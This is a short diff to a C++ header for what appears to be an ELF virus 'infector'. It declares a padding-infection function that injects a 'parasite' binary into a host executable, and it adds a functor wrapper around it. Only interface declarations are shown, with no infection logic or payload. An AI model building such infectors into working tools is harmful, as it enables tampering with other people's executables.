@@ -31,8 +31,14 @@ namespace vt::infector {
 //  - must contain certain signatures which can be patched to resume control
 //    back to the host. (our _start provided this already and is linked inside a
 //    parasite binary bazel macro for you)
-bool padding_infect64(const char* host_path, const char* parasite_path);
-
 bool padding_infect64(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                       common::Mmap<PROT_READ> parasite_mapping);
+
+struct PaddingInfect {
+  bool operator()(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
+                  common::Mmap<PROT_READ> parasite_mapping) {
+    return padding_infect64(vt::move(host_mapping), vt::move(parasite_mapping));
+  }
+};
+
 }  // namespace vt::infector
